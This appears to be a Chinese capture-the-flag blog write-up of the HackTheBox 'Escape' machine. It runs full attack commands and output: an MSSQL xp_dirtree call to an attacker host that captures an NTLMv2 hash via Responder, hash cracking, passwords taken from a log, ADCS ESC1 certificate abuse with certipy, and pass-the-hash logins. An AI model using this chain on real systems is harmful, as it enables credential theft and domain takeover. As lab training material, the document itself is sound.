---
title: "HTB Escape"
description: "HackTheBox篇ADCS系列之Escape"

date: 2025-03-19T19:24:19+08:00
lastmod: 2025-11-11T15:04:11+08:00

math: true
mermaid: true

categories:
  - HackTheBox
tags:
  - Windows
  - ADCS-ESC1
  - MSSQL
---
<!--more-->

> 靶机ip：10.10.11.202

# 知识点

* mssql 利用 xp_dirtree 获取 NetNTLM hash
* ADCS枚举
* ADCS ESC1提权

# 信息收集

使用`rustscan` 扫描端口

```shell
./rustscan -a 10.10.11.202 -u 5000
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
0day was here ♥

[~] The config file is expected to be at "/root/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.11.202:53
Open 10.10.11.202:88
Open 10.10.11.202:135
Open 10.10.11.202:139
Open 10.10.11.202:389
Open 10.10.11.202:445
Open 10.10.11.202:464
Open 10.10.11.202:593
Open 10.10.11.202:636
Open 10.10.11.202:1433
Open 10.10.11.202:3269
Open 10.10.11.202:3268
Open 10.10.11.202:5985
Open 10.10.11.202:9389
Open 10.10.11.202:49667
Open 10.10.11.202:49689
Open 10.10.11.202:49690
Open 10.10.11.202:49712
Open 10.10.11.202:49724
Open 10.10.11.202:49727
```

# SMB信息收集

使用`smbclient`尝试匿名访问

```shell
smbclient -L //10.10.11.202
Password for [WORKGROUP\root]:                                                         Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        Public          Disk
        SYSVOL          Disk      Logon server share
```

发现可以匿名访问

```shell
smbclient //10.10.11.202/Public
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Nov 19 19:51:25 2022
  ..                                  D        0  Sat Nov 19 19:51:25 2022
  SQL Server Procedures.pdf           A    49551  Fri Nov 18 21:39:43 2022

                5184255 blocks of size 4096. 1449739 blocks available
smb: \>
```

发现`SQL Server Procedures.pdf`文件，下载下来

在文件的最后可以找到一组`mssql`数据库用户名密码

![image-20250319200603832](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250319200605684-840021635.png)

```info
username: PublicUser
password: GuestUserCantWrite1
```

# MSSQL攻击

有一组用户名密码，拿`impacket-mssqlclient`工具连接

```shell
impacket-mssqlclient PublicUser:GuestUserCantWrite1@10.10.11.202
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLMOCK): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)
[!] Press help for extra shell commands
SQL (PublicUser  guest@master)>
```

尝试使用`xp_cmdshell`执行命令

```mssql
SQL (PublicUser  guest@master)> xp_cmdshell whoami
ERROR(DC\SQLMOCK): Line 1: The EXECUTE permission was denied on the object 'xp_cmdshell', database 'mssqlsystemresource', schema 'sys'.
```

很明显执行不了命令，尝试让 MSSQL 服务通过 `xp_dirtree` 向攻击机发起请求。并且通过 `Responder` 建立监听尝试捕获一些信息。

先建立监听：

```shell
responder -I tun0 -v
```

MSSQL发送请求：

```mssql
SQL (PublicUser  guest@master)> xp_dirtree \\10.10.16.13\test
subdirectory   depth   file
------------   -----   ----
```

`responder`监听的网卡会收到`sql_svc`的hash

```shell
[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.10.11.202
[SMB] NTLMv2-SSP Username : sequel\sql_svc
[SMB] NTLMv2-SSP Hash     : sql_svc::sequel:8612e788cb8bddf3:C6DA92175B23FD264635674CCD6EC5B2:010100000000000080925D370F99DB0178D8B8E92A6BD9F10000000002000800560038005700360001001E00570049004E002D004E00460048005300580055004E00360041004B00410004003400570049004E002D004E00460048005300580055004E00360041004B0041002E0056003800570036002E004C004F00430041004C000300140056003800570036002E004C004F00430041004C000500140056003800570036002E004C004F00430041004C000700080080925D370F99DB010600040002000000080030003000000000000000000000000030000038ECC847950C3FD11DDB45E0CEA201C6177644C6ECA7744DC5CF94943B059BE70A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00310033000000000000000000
```

将上述hash保存至文件hash中，使用`john`工具尝试破解

```shell
john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
REGGIE1234ronnie (sql_svc)
1g 0:00:00:17 DONE (2025-03-19 20:46) 0.05656g/s 605248p/s 605248c/s 605248C/s REINLY..REDMAN69
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

得到一组新的用户名密码

```info
username: sql_svc
password: REGGIE1234ronnie
```

已知一组用户名密码，端口开放5985，使用`netexec `验证一下能否通过`evil-winrm`工具登录

```shell
netexec  winrm 10.10.11.202 -u sql_svc -p REGGIE1234ronnie
WINRM       10.10.11.202    5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)
WINRM       10.10.11.202    5985   DC               [+] sequel.htb\sql_svc:REGGIE1234ronnie (Pwn3d!)
```

# 后渗透

发现可以登录，使用`evil-winrm`登录

```shell
evil-winrm -i 10.10.11.202 -u sql_svc -p REGGIE1234ronnie

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\sql_svc\Documents> whoami
sequel\sql_svc
*Evil-WinRM* PS C:\Users\sql_svc\Documents>
```

登陆成功，继续信息收集

```shell
*Evil-WinRM* PS C:\Users> ls


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         2/7/2023   8:58 AM                Administrator
d-r---        7/20/2021  12:23 PM                Public
d-----         2/1/2023   6:37 PM                Ryan.Cooper
d-----         2/7/2023   8:10 AM                sql_svc
```

发现另一个用户`Ryan.Cooper`

```shell
*Evil-WinRM* PS C:\SQLServer\Logs> ls


    Directory: C:\SQLServer\Logs


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         2/7/2023   8:06 AM          27608 ERRORLOG.BAK
```

在这个目录找到个错误日志的备份，`type`查看一下

```log
2022-11-18 13:43:07.44 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.72 spid51      Attempting to load library 'xpstar.dll' into memory. This is an informational message only. No user action is required.
2022-11-18 13:43:07.76 spid51      Using 'xpstar.dll' version '2019.150.2000' to execute extended stored procedure 'xp_sqlagent_is_starting'. This is an informational message only; no user action is required.
2022-11-18 13:43:08.24 spid51      Changed database context to 'master'.
```

在日志的最后找到`Ryan.Cooper`用户的密码

```info
username: Ryan.Cooper
password: NuclearMosquito3
```

使用`netexec `继续验证一下该用户

```shell
netexec  winrm 10.10.11.202 -u Ryan.Cooper -p NuclearMosquito3
WINRM       10.10.11.202    5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)
WINRM       10.10.11.202    5985   DC               [+] sequel.htb\Ryan.Cooper:NuclearMosquito3 (Pwn3d!)
```

奈斯！继续使用`evil-winrm`登录

```shell
evil-winrm -i 10.10.11.202 -u Ryan.Cooper -p NuclearMosquito3

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> whoami
sequel\ryan.cooper
```

登录成功，在该用户的`Desktop`找到`user.txt`

# ESC1提权

使用`netexec `尝试在域中枚举ADCS

```shell
netexec ldap 10.10.11.202 -u ryan.cooper -p NuclearMosquito3 -M adcs
SMB         10.10.11.202    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
LDAPS       10.10.11.202    636    DC               [+] sequel.htb\ryan.cooper:NuclearMosquito3
ADCS        10.10.11.202    389    DC               [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
ADCS        10.10.11.202    389    DC               Found PKI Enrollment Server: dc.sequel.htb
ADCS        10.10.11.202    389    DC               Found CN: sequel-DC-CA
```

发现CA证书，使用`certipy-ad`寻找攻击点

```shell
certipy-ad find -u 'Ryan.Cooper' -p 'NuclearMosquito3' -dc-ip 10.10.11.202 -stdout -vulnerable
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'sequel-DC-CA' via CSRA
[!] Got error while trying to get CA configuration for 'sequel-DC-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'sequel-DC-CA' via RRP
[*] Got CA configuration for 'sequel-DC-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : sequel-DC-CA
    DNS Name                            : dc.sequel.htb
    Certificate Subject                 : CN=sequel-DC-CA, DC=sequel, DC=htb
    Certificate Serial Number           : 1EF2FA9A7E6EADAD4F5382F4CE283101
    Certificate Validity Start          : 2022-11-18 20:58:46+00:00
    Certificate Validity End            : 2121-11-18 21:08:46+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : SEQUEL.HTB\Administrators
      Access Rights
        ManageCertificates              : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        ManageCa                        : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Enroll                          : SEQUEL.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : UserAuthentication
    Display Name                        : UserAuthentication
    Certificate Authorities             : sequel-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : PublishToDs
                                          IncludeSymmetricAlgorithms
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Client Authentication
                                          Secure Email
                                          Encrypting File System
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 10 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Domain Users
                                          SEQUEL.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : SEQUEL.HTB\Administrator
        Write Owner Principals          : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
        Write Property Principals       : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
    [!] Vulnerabilities
      ESC1                              : 'SEQUEL.HTB\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication
```

从最后的结果可知，可以利用ESC1提权

> 参考链接：https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc1-template-allows-san

```shell
certipy-ad req -u 'Ryan.Cooper' -p 'NuclearMosquito3' -ca 'sequel-DC-CA' -dc-ip '10.10.11.202' -template 'UserAuthentication' -upn 'Administrator' -debug
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Trying to connect to endpoint: ncacn_np:10.10.11.202[\pipe\cert]
[+] Connected to endpoint: ncacn_np:10.10.11.202[\pipe\cert]
[*] Successfully requested certificate
[*] Request ID is 12
[*] Got certificate with UPN 'Administrator'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

先同步一下时间

```shell
ntpdate -s sequel.htb
```

继续攻击

```shell
certipy-ad auth -pfx administrator.pfx -username Administrator -domain sequel.htb -dc-ip 10.10.11.202 -debug
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee
```

现在就拿到了Administrator的hash了，使用`netexec`测试能否通过`winrm`连接

```shell
netexec winrm 10.10.11.202 -u administrator -H aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee
WINRM       10.10.11.202    5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)
WINRM       10.10.11.202    5985   DC               [+] sequel.htb\administrator:a52f78e4c751e5f5e17e1e9f3e58f4ee (Pwn3d!)
```

使用`evil-winrm`登录Administrator

```shell
evil-winrm -i 10.10.11.202 -u administrator -H a52f78e4c751e5f5e17e1e9f3e58f4ee

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
sequel\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

成功登录Administrator，在`Desktop`找到`root.txt`

